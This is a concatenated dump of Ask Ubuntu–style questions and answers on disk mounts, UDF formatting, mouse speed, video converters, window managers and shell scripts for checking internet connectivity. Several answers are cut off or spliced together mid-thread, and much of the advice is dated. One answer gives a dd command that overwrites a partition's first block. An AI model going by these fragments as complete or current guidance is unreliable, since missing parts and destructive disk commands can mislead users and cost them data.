a dual-booted PC.

Generally softwares are installed via the terminal and by default a fixed path is used to where the post installation set up files can be found (I am talking in context of the drive).\nThis is like the typical case of Windows, where softwares by default are installed in the C: drive. These days people customize their installations to a drive which they find apt to serve their purpose (generally based on availability of hard disk space). I am trying to figure out how to customize the same for Ubuntu.\nAs we all know the most softwares are installed via commands given from the Terminal. My road block is how do I redirect the default path set on the terminal where files get installed to this new hard disk.\nThis if done will help me overcome space constraints I am currently facing wrt the partition on which my Ubuntu is initially installed. I would also by this, save time on not formatting my system and reinstalling Ubuntu and other softwares all over again.\nPlease help me with this, your suggestions are much appreciated.\n\nMy current situation:\n\nHi ,\nThis is just my current situation post the initial problem faced by me(as per the question posted) and how I actually tried to get around it...\nThank you for your answers and comments, I am sorry, I have already tried something else which seems to have zeroed down my chances of getting back Ubuntu up & running for me now on my PC.\nEvery time now I try booting Ubuntu, I guess due to lack of space it no more boots on my PC. All this happened after I made one change in the system mount file located at /etc/fstab.\nI changed the default location where my new hard disk was originally mounted. Originally it was mounted in /media/ubuntulinuxstore, I changed it to /usr. In other words I mounted /usr on this new hard disk and I guess also ended up making it a mount point for the hard disk. \nVery soon after, the entire behavoir of Ubuntu OS and various simple commands like sudo, vi etc. stopped functioning. Files could no longer be detected from how they were initially. I couldn't undo the changes I made to /etc/fstab as I was no more the su wasn't working any more and hence making me devoid of all write permissions wrt system files..\nI thought in this position a reboot would be the only last resort  kind of a rescue.\nI was in a position of having only around 10 MB free on my Ubuntu system. I tried booting it, the booting didn't succeed , it seemed to be stuck. This could be now because the /dev/sda2 was now 100% full leaving no memory ( may be virtual in particular to boot the OS ).\nI performed a memory test wrt Ubuntu OS, that was 100% successful for me, but of no avail. This test I could perform wrt an option I got in the GRUB when starting my PC.\nI tried booting via Ubuntu recovery mode, which I always get through GRUB as an option while starting my PC, this initially took me to a kind of interface. I tried vi /etc/fstab... to edit the mount location of the new hard disk( /dev/sdb1 ) to what it was originally ( /dev/sdb1              37G  214M   35G   1% /media/ubuntulinuxstore - as shown in the question above). But the only command that worked for me at that point of time was cat /etc/fstab. Even pico /dev/sdb1 didn't work for me.\nI also via GRUB typed 'e'( for edit ) and then tried to edit the kernel( again made use of 'e' ) with the intention to boot for a single user( I typed single next to the already existing lines written for a file that I obtained on typing 'e' wrt the kernel). Finally on pressing enter, I was at a step higher, at the parent directory where the option of kernel was originally present , from there I entered option b( to boot ). But this didn't help at all.\nNow finally every time i try booting Ubuntu via the grub, I am put in a loop due to errors wrt hard disk and I end up back at the original GRUB option. All this atleast didn't have an impact on my Windows OS. But it seems that I have almost lost Ubuntu and have to format it now freshly.\nI even tried out a whacky idea of disconnecting the new hard disk from the Cpu, but that went in vain and my problem still continues to persist..\nOnly seems like a miracle will save me now to retain Ubuntu.\nAny feedback or tips which I can carry to avoid such blunders in the future? \nI know this leaves me with almost no hope of getting back Ubuntu, but still I would gather some courage to ask one last time.. is there a way around this..??\nThank you very much for your patient reading and for any feedback obtained wrt my post..\n\nA: you can not set or otherwise move the location of the software installed via the system package manager (APT), Linux unlike Windows stores application components grouped by type, not by application, for example, executables go into /usr/bin, volatile content into /var, you can read more about it at http://en.wikipedia.org/wiki/Filesystem_Hierarchy_Standard .\nNow back to your problem, do you really need more space for applications or you need it for user data ? For user data you can relocate /home to the new partition, for applications you could relocate the entire /usr dir. Both require copying the contents to the new disk mount location (rsync is a good utility for that), then edit your /etc/fstab to mount those directories on the new device, and reboot.\n", "Q: how can i solve this error: no rule to make target 'Button icon.qml' needed by 'all-am'.stop this is the error when i am trying to make navit in ubuntu10.10\n   error: no rule to make target 'Button icon.qml' needed by 'all-am'.stop.\n\ni dont know how to solve it.somebody help me\n\nA: Try running sudo apt-get build-dep navit, then run ./configure && make again.\n\nA: If you are trying to build the source from this files you must get the missing .qml files from the SVN repository (https://navit.svn.sourceforge.net/svnroot/navit/trunk/navit) and place them under navit/gui/qml/skins/navit/\n", "Q: Can I connect to multiple networks for double bandwidth? If I used one wired connection to ISP_1 and another wireless connection to ISP_2, can Ubuntu benefit from both, such as running bit-torrent and getting twice the bandwidth?\n\nA: No, this is not possible.  You can connect to both ISPs at once, but each will give you a different IP address.  When you say, run a web browser and try to download something, it has to pick one IP address to use, and then its traffic will all be routed through that ISP.  You could run one program on one address and one on the other, but you can't get one download split across both links.\n\nA: To connect to two WiFi network at the same time, you have to have two WiFi modems in your computer. (Just like, you have to have two ethernet card to connect to two ethernet)\nYou may use an USB connected second WiFi modem.\nIf you have two modems and you've connected both, I think Ubuntu will automatically do load-balancing, and use both.\nIf not, it can be configured to do that, maybe like there\n\nA: Theoretically speaking, it should be possible, but it requires some advanced network configuration and has some caveats. Server Fault has a question/answer regarding configuring a Linux router to do load-balancing between two ISPs.\nIn summary:\n\n\n*\n\n*You cannot split a single TCP connection between two ISPs. That's because a connection is tied to a pair IP+Port, and your IP address is different in each ISP.\n\n*Although UDP does not have a \"connection\", the same restriction applies.\n\n*Each new connection will be (randomly) allocated to one of the two ISPs.\n\n*Since BitTorrent uses several parallel connections, you might notice a speedup there.\n\n*Browsing the web might not work very well, because some sites tie your session to your IP address (in addition to the cookies), which means some sites will log you out because you are changing IPs.\n\n", "Q: How can I increase the mouse pointer speed beyond the limits set by the Mouse preferences dialog? In the Mouse preferences dialog I've set the acceleration to max and the sensitivity to min and the mouse pointer is not exactly sluggish, but I'd like to make it even faster.

It's still slow, but it is faster than it was before.\nI guess it depends on the mouses DPI.\nThe Steelseries Sensei has the most DPI: 16000 DPI.\nA higher DPI is always better once you know it, but it isn't really that fast when you have one or more 4k monitors.\n\nA: The xset command allows you to change quite a few aspects of your desktop, including mouse acceleration.\nxset m 2 1\n\nThe first number is the acceleration, the second is threshold. So, in the example I provided, the mouse will go 2X as fast once it's traveled 1px across the screen. Zero has some special connotations, so I'd stick with 1.\nI wouldn't think you would need to set the acceleration too high to get what you're looking for.\nThis effect will disappear once you reboot/restart.

You can also very extensively fine tune the settings for your codec.\nThey seem to be mostly suited to run through command-line, but :\n1) Ready-to-use scripts can easily be found on the web\n2) Some GUI exists to make their use easier. (I know WINFF for FFmpeg and Handbrake, as mentionned by Allan, is also a GUI for FFmpeg)\n3) You may find interesting and funny to learn their specific languages and moreover, if you encounter troubles in adjusting some settings with the more user-friendly one, they might be the one which will work for you due the huge variety of their settings.\n\nA: \nConvert Audio, Video Files With FF Multi Converter\n\nFF Multi Converter supports the following formats:\naudio/video: aac, ac3, afc, aiff, amr, asf, au, avi, dvd, flac, flv, mka, mkv, mmf, mov, mp3, mp4, mpg, ogg, ogv, psp, rm, spx, vob, wav, webm, wma, wmv;\n\n\n\nInstall FF Multi Converter in Ubuntu\n\nsudo add-apt-repository ppa:ffmulticonverter/stable\nsudo apt-get update\nsudo apt-get install ffmulticonverter\n\nWebupd8\n\nA: There are at least four video converters you can try:\n\n\n*\n\n*arista | [Install arista]\n\n*transmageddon | [Install transmageddon]\n\n*ConvertMe!\n\n*Handbrake\nArista is a basic converter which you can add new conversion types to through there web site which will give you a new script which you can install adding the new conversion type.\nTransmageddon is the development version of arista which gives you the option to choose your specific encoding preferences in the program interface.\nConvertMe! is a very user friendly new frontend for FFmpeg. It comes with widly used presets and gives you a preview of the conversation progress. ConvertMe, intergrates with your Nautilus file manager allowing you to rightclick on an any video file and convert it instantly. View screenshot\nHandbrake has a limited number of output formats including mp4 and mkv but there are many more options available and a good description of what these options will do however handbrake is not in the software centre and you will need to add it by adding a PPA*\nwhich can be found at launchpad.\nThe ppa can be added through the software sources dialogue described here\nppa:stebbins/handbrake-snapshots\n\n\nA: Proabably the easiest to use is avidemux.\nIt has an intuitive graphical interface and can do lots of simple tasks, like convert, cut scenes etc.\n\nA: Transmageddon\n\nTransmageddon supports almost any format as its input and can generate a very large host of output files. The goal of the application was to help people to create the files they need to be able to play on their mobile devices and for people not hugely experienced with multimedia to generate a multimedia file without having to resort to command line tools with ungainly syntaxes.\nThe currently supported codecs are:\nContainers:\n\n\n*\n\n*Ogg\n\n*Matroska\n\n*AVI\n\n*MPEG TS\n\n*flv\n\n*QuickTime\n\n*MPEG4\n\n*3GPP\n\n*MXT\nAudio encoders:\n\n\n*\n\n*Vorbis\n\n*FLAC\n\n*MP3\n\n*AAC\n\n*AC3\n\n*Speex\n\n*Celt\nVideo encoders:\n\n\n*\n\n*Theora\n\n*Dirac\n\n*H264\n\n*MPEG2\n\n*MPEG4/DivX5\n\n*xvid\n\n*DNxHD\nIt also provide the support for the GStreamer's plugins auto-search.\nWinff\n\nWinFF is a graphical user interface for FFmpeg. It will convert almost any video file that FFmpeg will convert. WinFF does multiple files in multiple formats at one time. You can, for example, convert mpeg's, flv's, and mov's into avi's (or DVD/VCD format or MPEG or 3gp etc.) all at once.\nThis package provides a variety of preset conversion settings for common formats and devices. These presets are intended to hit the \"sweet spot\" for each individual codec. They have been written with a tip of the balance to quality.\nArista\n\nArista is a simple multimedia transcoder, it focuses on being easy to use by making complex task of encoding for various devices simple.\nUsers should pick an input and a target device, choose a file to save to and go. Features:\nPresets for iPod, computer, DVD player, PSP, Playstation 3, and more.\nLive preview to see encoded quality.\nAutomatically discover available DVD media and Video 4 Linux (v4l) devices.\nRip straight from DVD media easily (requires libdvdcss).\nRip straight from v4l devices.\nSimple terminal client for scripting.\nAutomatic preset updating.\n\n\nA: I found Mobile Media Converter (mmc) a truly handy tool, both on Windows as well as Ubuntu. It supports many audio/video formats and supports many mobile or hand-held devices too.\nYou can found the required version on http://www.miksoft.net/mobileMediaConverterDown.htm\nHope this answered your requirement :)\n\nA: As much as I like using mencoder and ffmpeg, I'm finding VLC to be the Swiss army knife of video conversions.\n\nA: Xilisoft Video Converter\n\nThere is no such Video conversion tool for Ubuntu except some but they didn't work for your iphone, blackberry, or Android devices. so what i did i install Wine from Ubuntu software center and then i download & install Xilisoft video converter its a window program  but works Great with wine in Ubuntu and its Supports all the formats of video file. so until now this is the only way to convert the video into other formats i.e., Avi, Mp4 (h.264), 3gp, and all other popular video formats are supported by Xilisoft so used it and Enjoy.\nThanks.\n\nA: I really like Vidrop, for me it's the best video converter, fast, with a simple or advance interface depending of your requirements.\n", "Q: Unwanted application starts automatically when I login When I log in to my Ubuntu system several applications that I added to startup list (by using System->Preferences->StartUp Application) start automatically. \nLast times I am seeing that among those startup applications there is also another one called \"Konqueror\" (which is a browser and browse me automatically https://unix.stackexchange.com/users/4458/bakhtiyor) which starts automatically. But I didn't add this application to startup list. I looked for every place that I knew to see why it was loading automatically but I could not find it.\nCould anybody help me to find out how that application is starting up automatically when a session starts please?\nNote that I don't have root permission in my system, because it is in my working place. I am using Ubuntu Desktop and GNOME.\nThank you.\n\nA: Go to System>Preferences>Startup apps, then on the Options tab uncheck the \"Automatically remember....\" checkbox.\n\nA: Actually, the main reason for automatically running Konqueror after initiating session was that I pressed accidentally the button called Remember Currently Running Applications which is located in System>Preferences>Startup apps under the Option tab.\n@nejode had guessed that first and posted his answer. In the comment he wrote that I can close all not wanted apps and press the Remember Currently Running Applications button again. I did that and it worked fine.\nBut, I started to look after the configuration file where this information is stored.  Finally I have found it in ~/.config/gnome-session/saved-session folder. So removing all files from their will remove all remembered running applications. And I think it is more easier way to do that.\nBy the way, would be nice in future to see Undo button along with Remember Currently Running Applications button.\nCheers.\n", "Q: Link to specific Tomboy note I'm trying to link to a specific tomboy note from the panel or from the desktop. I don't really like the notifaction \"click, dropdown, click\" way for a specific note I'm using, so I want to be able to open it with one seperate button.\nI couldn't find it on the website of Tomboy, nor did Google help me on this.\n\nA: Your tomboy notes are saved in ~/.local/share/tomboy. They have a .note ending.\nTo open a note from command line you can use tomboy --open-note YOUR_NOTE. The only problem is that they are not saved by their name but by some sort of hash.\nEither you find out what note it is or you write a small script which opens a note based on a specific creation date or some other aspect. You could also have the script read the first line of the note for a specific string.\n", "Q: Freezes if desktop effects is used I have found that using desktop effects in Ubuntu versions later than 8.10 causes the desktop to freeze after a few seconds on my PC. the command lspci -nn gave the following\n00:02.0 VGA compatible controller [0300]: Intel Corporation 82945G/GZ Integrated Graphics Controller [8086:2772] (rev 02)\n\nand with lspci -k I have  \n00:02.0 VGA compatible controller: Intel Corporation 82945G/GZ Integrated Graphics Controller (rev 02)\nKernel driver in use: i915\nKernel modules: i915\n\nThe intel graphics cards seems to have some performence issues with xorg driver. \nHowever I have not noticed any freeze in Ubuntu 8.10.\nThere are some workarounds at https://wiki.ubuntu.com/X/Bugs/Lucidi8xxFreezes to make them work. But I can't find out what workaround should I do with my graphics controller. I have tried workaround F but it did not help.\ncan anyone help me find a workaround for my graphics card?\nand\nis it actually possible to use desktop effect in this graphics card ? \n\nA: Disable the desktop effects:\nWe have three computers with the same chipset and the very same problem at work.\n20 PCs, 3 of them with the intel 945 chipset... the three of them have issues. They constantly freeze. We tried to boot in Ubuntu Classic, but it doesn't change anything.\nJust stick to 10.04 and disable the desktop effects.\n", "Q: Why is the default virtual terminal number 7? Why is the default virtual terminal in ubuntu tty7? is there any sort of precedent for this, or was that just the number that first came to mind?\n\nA: The first six consoles are text consoles, and X uses the first unallocated console. The number of text consoles is entirely arbitrary, but I remember it being default in Debian 1.2 (rex), so it is unlikely anyone still remembers the reason.\n\nA: It's not really anything special, and it's not like anyone person said: \"YES! TTY7 will forever be the starting point\".\nTypically when you boot init (upstart) will reserve the first 6 TTYs for text terminals - which leaves the next unallocated TTY, 7, for whatever comes next. Henceforth TTY7 is used when X actually starts. This can be changed to suite your liking in upstart by limiting or increasing the numbers of text TTYs that upstart reserves.\nHowever, it's typically best to just leave the configuration as is.\n\nA: The other virtual terminals are still there.  \nUse Ctrl+Alt+F1 to switch to /dev/tty1 and cycle up the Function keys to get through the other virtual terminals and finally back to your desktop environment.\nMarco Ceppi is incorrect; the terminals are not used/wasted during the boot-up process.\n", "Q: GUI keyword confusion Ive been using linux for some time, and ive never quite got my head around the various keywords attached to the GUI. \nI think i understand the difference between the likes of KDE and Gnome - They are collections of applications and other software that make up a given gui environment. However a quick read through any vaguely technical linux websites will reveal terms like:\n\n\n*\n\n*Murrine\n\n*Clearlooks\n\n*GTK\n\n*Beryl\n\n*Metacity\n\n*Window manager\n\n\nWhich if im honest, i have no real idea what they mean and how they all relate to each other. Can anybody clarify?\n\nA: I may confuse you further, but I'm going to add a few more words to that list. I've tried to highlight the buzzwords while I paint a picture of how things fit together.\nWindow managers\nIt might sounds silly but window managers manage your windows. They sit right next to the X Server (that controls what gets sent to hardware) and decrees how windows are painted to the desktop (itself a type of window).\nAs well as managing where the window goes, how big it is, if it's above something else, it's also responsible for decorations. Most window managers defer to another application called a window decorator. These decide how your window borders look, as well as giving you some options (resizing, window buttons, etc).\nMetacity (a window manager) has its own window decorator built-in but other window decorators you might see around include gtk-window-decorator (used by Compiz by default) and Emerald, spawned from Beryl which can do slightly fancier things at the cost of CPU cycles.\nBeryl, Metacity, Compiz are all window managers. Beryl was a fork of the original Compiz. It advanced well ahead of Compiz and was eventually merged back to form a project called Compiz-Fusion. Compiz-Fusion has now (AFAIK) been renamed back to Compiz although both names still apply to the same, modern project.\nGraphical Toolkits\nGTK+ (aka GTK) is a graphical toolkit that developers use to create rich, graphical user interfaces. Using tools like Glade, they decide how an application should look by placing GTK+ controls (eg a button) on a window, using further arrangement technologies like Glade.\nGTK+ also contains several sub-projects like Cairo and Pango, two graphics libraries that programmers can use to draw things inside their applications. In turn these libraries can reach out to more libraries to help them render things (like using Freetype to render text).\nGTK+ development libraries are a bottomless pit. I could literally spend all day listing them out but it won't really help you. So I won't.\nPart how these controls are rendered to the screen involves a theme engine. Each engine has n themes available for it and the user picks one in their preferences. That theme uses its engine to let controls render themselves onto the screen. Clearlooks and Murrine are both engines and they both have themes named after them, as well as a ton of other themes knocking around the internet.\nThe stack would look something like this, from bottom to top:\n\n*\n\n*GTK+ Control\n\n*GTK+ Engine and its GTK+ Theme\n\n*Application (X Server Client)\n\n*Window Decorator\n\n*Window Manager (aka compositor)\n\n*X Window Server\n\n*Hardware\n\nThat's ultra-simplified (I've just explained a compositing system) and a lot of that stuff can happen in altered orders, often running parallel rather than on top or beneath another layer... But it should give you an idea of how things get from code to screen.\nQt is another graphical toolkit which is very common in KDE applications. It has its own theming engines, themes and controls that similar to GTK+. They're not interchangable and require heavy code overhauls to port from one toolkit to the other.\n\nA: Metacity is a window manager. Window managers gives you the interesting decorations around the windows (title bar, close button, etc) as well as managing windows. GTK is a widget set which gives you the buttons, labels, checkboxs, etc in the actual windows. Clearlooks is a theme and Beryl is like compiz.\n", "Q: Get Window size in shell I would like to get the size of the current window from a shell script...\nReally not much else to say...

One line is output for each window, with the line broken up into space separated columns. The first column always contains the window identity as a hexadecimal integer, and the second column always contains the desktop number (a -1 is used to identify a sticky window). If the -p option is specified the next column will contain the PID for the window as a decimal integer. If the -G option is specified then four integer columns will follow: x-offset, y-offset, width and height. The next column always contains the client machine name. The remainder of the line contains the window title (possibly with multiple spaces in the title).\n\n\nA: Shell scripts do not know or care about windows.  At best they run in a terminal ( which may or may not be displayed in a window ).

One of the options when installing the driver from the nvidia .run file (version 270.26) is whether to install 32bit compatibility libraries.  You need to select NO on this if you have a 64 bit system.  When I disabled the driver from the repositories and reinstalled this driver without adding 32 bit compatibility support, the performance problems disappeared.

Will updated versions of Firefox land in old Ubuntu releases, such as Lucid and Maverick, when they are released by Mozilla?\n\nA: Yes, while a release of Ubuntu continues to be supported, it will receive the updated versions of Firefox. \nNote that most Ubuntu releases are supported for 18 months after release. For example 10.10 is over 18 months old, and will not receive security updates, such as new versions of Firefox. There are some Ubuntu releases that are LTS (Long Term Support) releases which will continue to be supported for three or five years.\nThe graph below (from Wikipedia) shows the support for various releases. Yellow is the standard 18 months. Orange is the extended support on the Desktop. (Red is extended support on the Server only, this does not include Firefox.)\n\n\nA: New Firefox versions will become your default browser if Firefox is your default browser, and you install the updates available for your system.\nThe browser that comes with 11.04 is FireFox 4.0 and while it is the default it is not the latest version. You can update it if you like, and as long as you didn't change the default from firefox, you will have the latest FireFox as your default after the update. But this is not exactly automatic by any stretch.\n", "Q: What are post-installation triggers? What are post-installation triggers?  These are executed when upgrading software.\n\nA: Debian packages contain more than just files. Among other things, they often contain scripts that doesn't get installed, but are run before or after installing/uninstalling the files from a package. For example, the linux-kernel packages will run a script that adds the newly installed kernel to the bootloader menu after it has installed the actual files.\nSo when it says post-installation triggers, it is running such scripts.\n\nA: From wiki.ubuntu.com/DpkgTriggers:\n\nA dpkg trigger is a facility that allows events caused by one package but of interest to another package to be recorded and aggregated, and processed later by the interested package. This feature simplifies various registration and system-update tasks and reduces duplication of processing.\n\nA more detailed description of dpkg triggers is here: http://lists.debian.org/debian-dpkg/2007/04/msg00076.html\n", "Q: Can and should UDF be used as a hard drive format? Several time recently I've seen UDF suggested as the solution to a cross platform format for a drive used on Linux, Mac OS X and Windows XP and above.\nI've searched here and not found the same suggestion (most are suggesting ntfs-3g which seems to cost money and isn't preinstalled on a Mac).\nSo my question is: how is this done right, and has anyone done this? Have you then filled up the drive and deleted some files to make space finding that everything works like a real r/w format even though it seems to have been primarily a write once format?\nCall me crazy but I'd really like it if the UDF system would also automount and be writable by the logged in user.  What I've tried so far (udftools formatting as mentioned by kicsyromy) doesn't address this wish.\n\nA: Someone did some research into how to format a flash drive with udf so it can be used on as many operating systems as possible. Here are his findings (used to be there, now offline):\n\n*\n\n*Windows 7 have full support up to UDF v2.6, but the UDF block size must match the block size of the underlying device (which for USB-sticks and most disks is 512 bytes; \"advanced format\" disks are 4096 bytes). Apparently the disk must be partitioned.\n\n\n*Linux 2.6.30 and up supports UDF fully at least up to version 2.5.\n\n\n*Mac OS X 10.5 supports UDF fully up to UDF 2.01, but only when used on a full disk, so not partitioned.\nAs explained above, for USB harddisks, Windows requires the disk to be partitioned. On the other side, UDF only works in OS X when it is used on a full disk (unpartitioned). Rather surprisingly, there is a solution which works for both: having the disk partitioned and unpartitioned at the same time.\nDOS partition tables are stored in bytes 446-510 of the master boot record. This master boot record is stored in the first sector on disk, sector 0. Typically, the first partition specified will start some kilobytes further. However, it seems possible to construct a partition table whose first partition starts at sector 0, so the result is a partition which contains the partition table itself. Partition editor programs seem to refuse to create such a table, but at least recent Linux and Windows kernels don’t seem to bother.\nThe nice thing is that UDF does not (I suppose deliberately) use the first few kilobytes of the partition or disk it is placed on, so this place can really be used to store a legacy partition table, referring to a partition that spans the whole disk. Some testing shows that this really works on Linux, Windows and Mac OS X:\n\n*\n\n*Mounts automatically read-write in Linux 2.6.30+, Mac OS X 10.5+, Windows Vista+\n\n*Can be used read-only in Windows XP, and be used after a command line mount in Linux 2.6.0+\n\n*Supports large files, UNIX permissions, Unicode filenames, symlinks, hardlinks, etc.\n\nScript to format the disk properly: Perl script or Bash script\n\nA: No.\nWe're in 2015 at the time of this reply. I am using OSX Yosemite, Ubuntu 14.10, and the Windows 10 technical preview for enterprises on a Mactel machine (Macmini 7,1).\nI tried both UDF and exFat. I use Ubuntu for development and do need Unix-style permissions.\nAll former guides do not apply anymore: UDF drivers have evolved and all operating systems will accept a UDF partition, with more problems and instabilities than I can name.\n\n\n*\n\n*UDF drive formatted on Mac OS: can't be mounted on Windows 10.\n\n*UDF drive formatted on Linux: can't be mounted on Windows 10.\n\n*UDF drive formatted on Windows 10: mounts read/write on Linux, read-only on OSX.\n\n\nHowever, Windows doesn't allow you to specify a block size when formatting a UDF volume, and as a result, your logical block size might differ from the physical block size for the partition.\nI am unclear whether this has to do with the difficulties I had mounting it read/write on OSX, but after deleting a certain number of files using Linux, I was never able to mount the drive again on OSX. \nThe system goes into kernel panic and crashes disgracefully.\nThis, and a variety of answers on the subject, indicate inconsistent support for this format at this point.\nIt would seem there are ways I can use a NTFS volume to achieve a balance between the features of a modern file system, Unix-style permissions - I might be able to set them - and read/write mount on all operating systems.\n\nA: I just tested this out in a VM. It seems that you need to (re)create your partition in Windows assign it a drive letter but don't format it to any filesystem. After that boot into Ubuntu and just follow the directions and it should work for read/write.\nRemember to backup all your data!\nFirst off install UDF tools:\nsudo apt-get install udftools\n\nReplace the first block with nothing on the partition you wish to format to UDF^:\nsudo dd if=/dev/zero of=/dev/sdxN bs=512 count=1\n\nAnd finally format to UDF^:\nsudo mkudffs --media-type=hd --blocksize=512 /dev/sdxN\n\n^where by:\n\n\n*\n\n*x is a placeholder for the letter curently assigned to your hardisk\n\n*N is a placeholder for the partition number\nBest of luck and let me know if it worked out for you.\n", "Q: USB device changes using udev and D-Bus I am trying to get a list of currently plugged in USB devices in Ubuntu 10.10 and monitor changes that happen, like devices being plugged in or out using udev and D-Bus. \nI'm fairly new to programming using D-Bus. I saw one example: \"Linux: How to detect is usb keyboard is plugged and unplugged\".

Is there an easy way to check Internet connectivity from console? I am trying to play around in a shell script.\nOne idea I seem is to wget --spider http://www.google.co.in/ and check the HTTP response code to interpret if the Internet connection is working fine. But I think there must be easy way without the need of checking a site that never crash ;)\nEdit: Seems like there can be a lot of factors which can be individually examined, good thing. My intention at the moment is to check if my blog is down. I have setup cron to check it every minute.\nFor this, I am checking the HTTP response code of wget --spider to my blog. If its not 200, it notifies me (I believe this will be better than just pinging it, as the site may under be heavy load and may be timing out or respond very late). Now yesterday, there was some problem with my Internet. LAN was connected fine but just I couldn't access any site. So I keep on getting notifications as the script couldn't find 200 in the wget response. Now I want to make sure that it displays me notification when I do have internet connectivity.\nSo, checking for DNS and LAN connectivity is a bit overkill for me as I don't have that much specific need to figure out what problem it is. So what do you suggest how I do it?\nHere is my script to keep checking downtime for my blog:\n#!/bin/bash\n\n# Sending the output of the wget in a variable and not what wget fetches\nRESULT=`wget --spider http://blog.ashfame.com 2>&1`\nFLAG=0\n\n# Traverse the string considering it as an array of words\nfor x in $RESULT; do\n    if [ \"$x\" = '200' ]; then\n        FLAG=1 # This means all good\n    fi\ndone\n\nif [ $FLAG -eq '0' ]; then\n    # A good point is to check if the internet is working or not\n        # Check if we have internet connectivity by some other site\n        RESULT=`wget --spider http://www.facebook.com 2>&1`\n        for x in $RESULT; do\n            if [ \"$x\" = '200' ]; then\n                FLAG=1 # This means we do have internet connectivity and the blog is actually down\n            fi\n        done\n\n    if [ $FLAG -eq '1' ]; then\n        DISPLAY=:0 notify-send -t 2000 -i /home/ashfame/Dropbox/Ubuntu/icons/network-idle.png \"Downtime Alert!\" \"http://blog.ashfame.com/ is down.\"         \n    fi  \nfi\n\nexit\n\nThis way I need to check for internet connectivity only where there is an issue with my blog response code. Its a bit heavy (as I am not using ping) but should not give any false positives. Right? Also how can I randomize pinging to a different site everytime, like facebook, google, yahoo etc. Also (I was trying to avoid any I/O) I can write to a log file by which I can check the count of downtime checks and then skip further checks till the site is down or cause longer checks (10mins instead of every min). What do you think?\n\nA: I'm using this method... \n\nif [[ \"$(ping -c 1 8.8.8.8 | grep '100% packet loss' )\" != \"\" ]]; then\n    echo \"Internet isn't present\"\n    exit 1\nelse\n    echo \"Internet is present\"\n    wget www.site.com\nfi\n\n\nA: Checking to see if a site is up is usually done with a monitoring tool like nagios.  This will continuously monitor the site, and can notify you of outages.\nWhen checking if the Internet is up from the command line I run through a number of steps:\n\n\n*\n\n*Check Internet is up ping google.com (checks DNS and known reachable site). \n\n*Check web site is up use wget or w3m to fetch page.\n\n\nIf Internet is not up diagnose outward.\n\n\n*\n\n*Check gateway is pingable. (Check ifconfig for gateway address.)\n\n*Check DNS servers are pingable. (Check /etc/resolv.conf for addresses.)\n\n*Check to see if firewall is blocking. (Check /var/log/syslog as I log blocks.)\n\n\nIf Internet is up but site is down check with w3m http://isup.me/example.com replacing example.com with the site that appears down.  Use wget, lynx, or which ever command line browser you have available if you don't have the w3m browser installed.\n\nA: This is the shell srcript I'm using to test for internet connectivity:\nalarm.sh\n#! /bin/bash\n\nif curl --silent --head http://www.google.com/ |\n    egrep \"20[0-9] Found|30[0-9] Found\" >/dev/null\nthen\n    echo Internet status: OK\nelse\n    echo Internet status: ERROR\n    mpg321 alarm.mp3 &> /dev/null\nfi\nsleep 60\nclear\n\n./alarm.sh\n\nYou will need to install curl and mpg321\nsudo apt-get install curl mpg321\n\nYou will need a .mp3 sound file renamed to alarm.mp3 in the same folder if you want audible alarm functionality. Finally configure website URL and egrep to your needs.\n\nA: I am using this method:\nif curl -s --head  --request GET www.google.com | grep \"200 OK\" > /dev/null ; then\n    echo \"Internet is present\"\nelse\n    echo \"Internet isn't present\"\nfi\n\nIt will try to connect to a well-known website and if it can connect to it then we will assume there is the internet.\n\nA: Checking whether specific website is up\nFirst, multiple good online monitoring services are available. To pick one, Pingdom includes free account for monitoring one target. (Disclaimer: I am not affiliated with Pingdom in any way).\nSecond, using wget --spider for your own script is a good idea. You'll get some false positives when your computer is down, or when your DNS server is not working. Checking the return code is straightforward way to do implement this:\nwget --spider --quiet http://example.com\nif [ \"$?\" != 0 ]; then\n  echo \"Website failed!\" | mail -s \"Website down\" your_email@provider.tld\nfi\n\nYet again, there are shortcomings in this approach. If your provider has cached your DNS record, but the DNS server is down, others can't access your site even though monitoring says everything is fine. You can write short workaround with host, for example host example.com <your dns server IP>. That will return error if DNS server is not responding, even if OpenDNS or your own provider's DNS server works fine.\nChecking whether internet is working\nThere isn't really easy way to handle this in every case.\nYou can for example run ping -c1 on multiple well known sites (for example www.google.com, facebook.com and ping.funet.fi) and check return codes to determine whether any destination is reachable. You can automatically check return code by using variable $?. Parameter -c1 is limiting number of ping packets to one.\nYou may encounter problems with some public wifis when there is a login gateway that redirects all pings and HTTP requests. If so, you may get ping responses and non-error HTTP status codes, even when you can't access any other sites.\nIf you want to check cable state, you can use\nsudo ethtool eth0\n\nFrom output (excerpt):\nSpeed: 1000Mb/s\nDuplex: Full\nPort: Twisted Pair\nLink detected: yes\n\nHowever, this is not telling whether you really have connectivity or not, just whether cable is connected and something is on other end.\n\nA: Checking whether internet is working\nsudo nm-tool | grep \"State: connected\" | wc -l\n\nFrom output (excerpt):\n1 #System is connected to internet\n\nHowever, as mentioned by others, this is not telling whether you really have connectivity or not. Eg. You could be connected to the router and router is not necessarily connected to internet.\n\nA: I just used \nnm-online\n\nwhich pauses until a network connection is present by network manager. Worked well. You can do other stuff with it too.\n\nA: I needed help with the same question, and I got my answer this way:\necho $(nm-online) $? connection problems\n\n\nA: I was looking for a script that would continuously test my internet connection, that would be started whenever my server was up and I made this:\n\n\n*\n\n*First, install fping\napt-get install fping\n\n\n*Create an init script in the /etc/init.d folder with the following content (I called it testcon)\n#!/bin/bash\n\nPIDFILE=/var/run/testcon.pid\n\n. /lib/lsb/init-functions\n\ncase \"$1\" in\n  start)\n        log_daemon_msg \"Starting internet connection tester\"\n        /etc/init.d/testcond &\n        echo $! > $PIDFILE\n        log_end_msg $?\n    ;;\n  stop)\n        log_daemon_msg \"Stopping internet connection tester\"\n        PID=$(cat $PIDFILE)\n        kill -9 \"$PID\"\n        log_end_msg $?\n    ;;\n  *)\n    echo \"Usage: /etc/init.d/testcon {start|stop}\"\n    exit 1\n    ;;\nesac\n\nexit 0\n\n\n*Create a script in the /etc/init.d folder with the following content (I called it testcond)\n#echo Computer starting or testing daemon init\nwhile [ \"$itest\" == \"\" ] \ndo\n    #wait 5 seconds \n    sleep 5\n    itest=$(fping 8.8.8.8 | grep alive)\ndone\ndate | mail -s \"Server is up and Internet is online\" your_email@gmail.com\n\n#loop forever\nwhile [ \"1\" == \"1\" ] \ndo\n    itest=$(fping 8.8.8.8 | grep alive)\n    #if internet is down\n    if [ \"$itest\" == \"\" ] \n    then\n        #echo Internet is down\n        #log time it was found down\n        current_time=$(date)\n        echo \"Internet was found down @ $current_time\" >> /mnt/data/Server/internet_log.txt\n        #loop until it is back\n        while [ \"$itest\" == \"\" ] \n        do\n            #wait 60 seconds \n            sleep 60\n            itest=$(fping 8.8.8.8 | grep alive) # test the 